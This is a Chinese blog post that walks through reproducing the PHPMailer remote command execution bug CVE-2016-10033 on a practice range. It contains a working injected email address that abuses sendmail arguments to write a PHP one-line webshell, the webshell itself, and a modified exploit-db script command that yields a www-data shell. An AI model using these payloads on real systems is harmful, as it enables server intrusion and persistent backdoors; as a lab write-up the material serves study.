---
title: "PHPMailer远程命令执行漏洞复现"
categories: [ "安全技术" ]
tags: [ "漏洞利用","RCE","cve" ]
draft: false
slug: "557"
date: "2020-04-07 09:57:00"
---

## 0x01 漏洞原理

知识点梳理，靶场复现

漏洞编号：CVE-2016-10033

影响范围：PHPMailer 版本<5.2.18

> PHPMailer 中的 mail 函数在发送邮件时使用了系统 sendmail 方法，由于没有足够过滤使得用户可以注入攻击代码

`PHPMailer`命令执行漏洞（CVE-2016-10033）利用`escapeshellarg`和`escapeshellcmd`两个函数结合使用，导致了单引号逃逸。具体的漏洞分析和利用过程可以通过合天网安的[这个实验][1]进行，但是要价 200 和氏币：

![][2]

## 0x02 靶场复现

先用[墨者靶场][3]复现

打开页面是一个英文网站，拉到底部有个邮件链接：

![][4]

点进去，是个邮件发送界面；

![][5]

Exp：

构造邮箱

```
"attacker\" -oQ/tmp -X/var/www/html/shell.php soapffz"@gmail.com
```

消息：

```
<?php @eval($_POST[a]);?>
```

![][6]

`sendmail -X`参数可以将日志写入指定文件，发送后页面卡住了，但是不要紧，其实一句话木马已经写入了

![][7]

上蚁剑连接：

![][8]

拿到`key`

## 0x03 rce-exp

`exp`[地址][9]，下载后，测试远程目标运行如下命令：

```
./exploit host:port
```

本地测试如下：

```
./exploit localhost:8080
```

默认的`exp`只给两个参数`host`和`port`，本题里面还有目录`mail.php`，简单修改即可：

只需把

```
curl -sq 'http://'$host -H 'Content-Type:
```

中添加你对应的目录即可：

```
curl -sq 'http://'$host/mail.php -H 'Content-Type:
```

![][10]

成功获取到远程`shell`，权限是`www-data`用户

## 0x04 尝试提权

还没。。

本文完。

参考文章：

- [PHP escapeshellarg()+escapeshellcmd() 之殇][11]
- [PHPMailer < 5.2.18 远程命令执行漏洞环境 (CVE-2016-10033)][12]
- [WordPress <= 4.6 命令执行漏洞(PHPMailer)(CVE-2016-10033)][13]

[1]: http://www.hetianlab.com/expc.do?ec=ECID2117-c828-49a4-89bf-b5f362976166
[2]: https://img.soapffz.com/archives_img/2020/04/07/archives_20200407_152553.png
[3]: https://www.mozhe.cn/bug/detail/124
[4]: https://img.soapffz.com/archives_img/2020/04/07/archives_20200407_102314.png
[5]: https://img.soapffz.com/archives_img/2020/04/07/archives_20200407_102346.png
[6]: https://img.soapffz.com/archives_img/2020/04/07/archives_20200407_102900.png
[7]: https://img.soapffz.com/archives_img/2020/04/07/archives_20200407_103007.png
[8]: https://img.soapffz.com/archives_img/2020/04/07/archives_20200407_103151.png
[9]: https://www.exploit-db.com/exploits/40968
[10]: https://img.soapffz.com/archives_img/2020/04/07/archives_20200407_154542.png
[11]: https://paper.seebug.org/164/
[12]: http://vulapps.evalbug.com/p_phpmailer_1/
[13]: http://vulapps.evalbug.com/w_wordpress_6/